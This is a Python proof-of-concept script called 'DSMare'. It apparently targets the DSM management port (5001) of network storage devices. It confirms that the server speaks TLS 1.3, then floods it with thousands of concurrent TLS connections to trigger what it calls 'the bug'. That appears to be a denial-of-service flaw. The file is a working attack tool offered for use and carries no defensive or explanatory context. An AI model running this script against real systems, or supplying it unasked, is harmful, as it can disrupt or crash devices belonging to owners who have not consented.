#!/usr/bin/env python3
import ssl
import socket
import threading
import time
import argparse
import sys
from queue import Queue, Empty

def _make_session(host: str, port: int, ctx: ssl.SSLContext, results: Queue) -> None:
    t0 = time.monotonic()
    try:
        raw = socket.create_connection((host, port), timeout=10)
        tls = ctx.wrap_socket(raw, server_hostname=host)

        version = tls.version()
        if version != "TLSv1.3":
            results.put(("skip", f"server negotiated {version}, not TLS 1.3"))
            tls.close()
            return

        tls.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")

        try:
            while tls.read(4096):
                pass
        except (ssl.SSLError, OSError):
            pass 

        tls.close()
        results.put(("ok", time.monotonic() - t0))

    except (socket.timeout, ConnectionRefusedError, OSError) as exc:
        results.put(("err", str(exc)))
    except ssl.SSLError as exc:
        results.put(("ssl", str(exc)))

def _worker(host: str, port: int, ctx: ssl.SSLContext,
            task_queue: Queue, results: Queue, delay: float) -> None:
    while True:
        try:
            task_queue.get(timeout=1)
        except Empty:
            return
        _make_session(host, port, ctx, results)
        task_queue.task_done()
        if delay > 0:
            time.sleep(delay)

def main() -> None:
    parser = argparse.ArgumentParser(
        description="DSMare"
    )
    parser.add_argument("host", help="Target hostname or IP")
    parser.add_argument("port", nargs="?", type=int, default=5001,
                        help="HTTPS port (default: 5001, DSM default)")
    parser.add_argument("--connections", "-n", type=int, default=2000,
                        help="Total connections to send (default: 2000)")
    parser.add_argument("--threads", "-t", type=int, default=20,
                        help="Concurrent connection threads (default: 20)")
    parser.add_argument("--delay", "-d", type=float, default=0.0,
                        help="Per-thread delay between connections in seconds (default: 0)")
    args = parser.parse_args()

    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3
        ctx.maximum_version = ssl.TLSVersion.TLSv1_3
    except AttributeError:
        print("[!] Python >= 3.7 required to pin TLS 1.3.  Continuing without pinning.")

    print(f"[*] Target      : {args.host}:{args.port}")
    print(f"[*] Connections : {args.connections}")
    print(f"[*] Threads     : {args.threads}")
    print()

    print("[*] Checking target reachability and TLS version...")
    probe_q: Queue = Queue()
    _make_session(args.host, args.port, ctx, probe_q)
    status, val = probe_q.get()
    if status == "err":
        print(f"[!] Connection failed: {val}")
        sys.exit(1)
    if status == "ssl":
        print(f"[!] TLS error: {val}")
        sys.exit(1)
    if status == "skip":
        print(f"[!] {val}")
        print("[!] Server must negotiate TLSv1.3 for the bug to trigger.")
        sys.exit(1)
    print(f"[+] Connected OK — TLSv1.3 confirmed (RTT {val*1000:.1f} ms)")
    print()

    # Dispatch.
    task_queue: Queue = Queue()
    results: Queue = Queue()

    for _ in range(args.connections):
        task_queue.put(None)

    threads = [
        threading.Thread(
            target=_worker,
            args=(args.host, args.port, ctx, task_queue, results, args.delay),
            daemon=True,
        )
        for _ in range(args.threads)
    ]

    t_start = time.monotonic()
    for th in threads:
        th.start()

    ok = err = skip = 0
    report_interval = max(1, args.connections // 20) 
    last_report = 0

    while ok + err + skip < args.connections:
        try:
            status, val = results.get(timeout=0.5)
        except Empty:
            continue

        if status == "ok":
            ok += 1
        elif status == "skip":
            skip += 1
        else:
            err += 1

        done = ok + err + skip
        if done - last_report >= report_interval or done == args.connections:
            elapsed = time.monotonic() - t_start
            rate = done / elapsed if elapsed > 0 else 0
            print(
                f"  [{done:>{len(str(args.connections))}}/{args.connections}]  "
                f"ok={ok}  err={err}  skip={skip}  "
                f"{rate:.1f} conn/s  elapsed={elapsed:.1f}s"
            )
            last_report = done

    for th in threads:
        th.join()

    elapsed = time.monotonic() - t_start
    print()
    print(f"[+] Done — {ok} successful, {err} errors, {skip} skipped in {elapsed:.1f}s")
    print()

    if ok == 0:
        print("[!] No successful connections — cannot confirm vulnerability.")
        return

if __name__ == "__main__":
    main()